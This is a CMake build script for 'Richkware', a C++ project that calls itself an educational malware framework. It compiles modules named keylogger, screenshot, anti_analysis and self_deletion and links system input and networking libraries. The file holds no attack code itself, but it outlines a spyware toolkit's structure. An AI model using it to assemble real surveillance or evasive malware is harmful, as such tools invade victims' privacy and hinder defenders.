cmake_minimum_required(VERSION 3.20)

project(Richkware
    VERSION 2.0.0
    DESCRIPTION "Modern C++ malware framework for educational purposes"
    LANGUAGES CXX
)

# Set C++ standard
set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Build options
option(RICHKWARE_BUILD_TESTS "Build unit tests" ON)
option(RICHKWARE_BUILD_EXAMPLES "Build examples" ON)
option(RICHKWARE_ENABLE_ASAN "Enable AddressSanitizer" OFF)
option(RICHKWARE_ENABLE_TSAN "Enable ThreadSanitizer" OFF)
option(RICHKWARE_ENABLE_COVERAGE "Enable code coverage" OFF)

# Platform detection
if(WIN32)
    set(RICHKWARE_PLATFORM "Windows")
elseif(UNIX AND NOT APPLE)
    set(RICHKWARE_PLATFORM "Linux")
elseif(APPLE)
    set(RICHKWARE_PLATFORM "macOS")
endif()

message(STATUS "Building for platform: ${RICHKWARE_PLATFORM}")

# Compiler-specific options
if(MSVC)
    add_compile_options(/W4 /WX /permissive-)
    add_compile_definitions(_CRT_SECURE_NO_WARNINGS)
else()
    add_compile_options(-Wall -Wextra -Wpedantic -Werror)
    
    # Cross-compilation for Windows from Linux
    if(CMAKE_CROSSCOMPILING AND WIN32)
        set(CMAKE_CXX_COMPILER "x86_64-w64-mingw32-g++")
        set(CMAKE_C_COMPILER "x86_64-w64-mingw32-gcc")
    endif()
endif()

# Sanitizers
if(RICHKWARE_ENABLE_ASAN)
    add_compile_options(-fsanitize=address -fno-omit-frame-pointer)
    add_link_options(-fsanitize=address)
endif()

if(RICHKWARE_ENABLE_TSAN)
    add_compile_options(-fsanitize=thread)
    add_link_options(-fsanitize=thread)
endif()

# Code coverage
if(RICHKWARE_ENABLE_COVERAGE)
    add_compile_options(--coverage)
    add_link_options(--coverage)
endif()

# Find dependencies
find_package(OpenSSL REQUIRED)
find_package(Threads REQUIRED)
if(UNIX AND NOT APPLE)
    find_package(X11 REQUIRED)
    find_package(PNG REQUIRED)
endif()

# Include directories
include_directories(include)

# Source files
file(GLOB_RECURSE RICHKWARE_SOURCES
    "src/core/*.cpp"
    "src/crypto/*.cpp"
    "src/network/*.cpp"
    "src/system/*.cpp"
    "src/modules/*.cpp"
    "src/utils/*.cpp"
)

# Ensure all module files are included
list(APPEND RICHKWARE_SOURCES
    "src/modules/file_manager.cpp"
    "src/modules/keylogger.cpp"
    "src/modules/screenshot.cpp"
    "src/modules/process_manager.cpp"
    "src/modules/anti_analysis.cpp"
    "src/modules/self_deletion.cpp"
)

file(GLOB_RECURSE RICHKWARE_HEADERS
    "include/richkware/*.hpp"
)

# Create main library
add_library(richkware_lib STATIC ${RICHKWARE_SOURCES} ${RICHKWARE_HEADERS})
set_target_properties(richkware_lib PROPERTIES LINKER_LANGUAGE CXX)

target_include_directories(richkware_lib
    PUBLIC
        $<BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include>
        $<INSTALL_INTERFACE:include>
    PRIVATE
        ${CMAKE_CURRENT_SOURCE_DIR}/src
)

target_link_libraries(richkware_lib
    PUBLIC
        OpenSSL::SSL
        OpenSSL::Crypto
        Threads::Threads
)

# Platform-specific libraries
if(WIN32)
    target_link_libraries(richkware_lib
        PUBLIC
            ws2_32
            wininet
            advapi32
            shell32
            user32
            kernel32
    )
elseif(UNIX AND NOT APPLE)
    target_link_libraries(richkware_lib
        PUBLIC
            X11::X11
            Xtst
            PNG::PNG
    )
endif()

# Compiler definitions
target_compile_definitions(richkware_lib
    PUBLIC
        RICHKWARE_VERSION_MAJOR=${PROJECT_VERSION_MAJOR}
        RICHKWARE_VERSION_MINOR=${PROJECT_VERSION_MINOR}
        RICHKWARE_VERSION_PATCH=${PROJECT_VERSION_PATCH}
    PRIVATE
        $<$<PLATFORM_ID:Windows>:WIN32_LEAN_AND_MEAN>
        $<$<PLATFORM_ID:Windows>:NOMINMAX>
        $<$<PLATFORM_ID:Windows>:_WIN32_WINNT=0x0A00>
)

# Create executable
add_executable(richkware main.cpp)
target_link_libraries(richkware richkware_lib)

# Set output directories
set_target_properties(richkware richkware_lib
    PROPERTIES
        ARCHIVE_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib"
        LIBRARY_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib"
        RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin"
)

# Examples
if(RICHKWARE_BUILD_EXAMPLES AND EXISTS "${CMAKE_CURRENT_SOURCE_DIR}/examples")
    add_subdirectory(examples)
endif()

# Tests
if(RICHKWARE_BUILD_TESTS)
    find_package(GTest QUIET)
    if(GTest_FOUND)
        enable_testing()
        add_subdirectory(tests)
    else()
        message(WARNING "GTest not found, skipping tests")
    endif()
endif()

# Installation
install(TARGETS richkware richkware_lib
    EXPORT RichkwareTargets
    RUNTIME DESTINATION bin
    LIBRARY DESTINATION lib
    ARCHIVE DESTINATION lib
)

install(DIRECTORY include/
    DESTINATION include
    FILES_MATCHING PATTERN "*.hpp"
)

install(EXPORT RichkwareTargets
    FILE RichkwareTargets.cmake
    NAMESPACE Richkware::
    DESTINATION lib/cmake/Richkware
)

# Package configuration
include(CMakePackageConfigHelpers)

configure_package_config_file(
    "${CMAKE_CURRENT_SOURCE_DIR}/cmake/RichkwareConfig.cmake.in"
    "${CMAKE_CURRENT_BINARY_DIR}/RichkwareConfig.cmake"
    INSTALL_DESTINATION lib/cmake/Richkware
)

write_basic_package_version_file(
    "${CMAKE_CURRENT_BINARY_DIR}/RichkwareConfigVersion.cmake"
    VERSION ${PROJECT_VERSION}
    COMPATIBILITY SameMajorVersion
)

install(FILES
    "${CMAKE_CURRENT_BINARY_DIR}/RichkwareConfig.cmake"
    "${CMAKE_CURRENT_BINARY_DIR}/RichkwareConfigVersion.cmake"
    DESTINATION lib/cmake/Richkware
)

# CPack configuration
set(CPACK_PACKAGE_NAME "Richkware")
set(CPACK_PACKAGE_VERSION ${PROJECT_VERSION})
set(CPACK_PACKAGE_DESCRIPTION_SUMMARY ${PROJECT_DESCRIPTION})
set(CPACK_PACKAGE_VENDOR "Richkware Project")
set(CPACK_RESOURCE_FILE_LICENSE "${CMAKE_CURRENT_SOURCE_DIR}/LICENSE")
set(CPACK_RESOURCE_FILE_README "${CMAKE_CURRENT_SOURCE_DIR}/README.md")

include(CPack)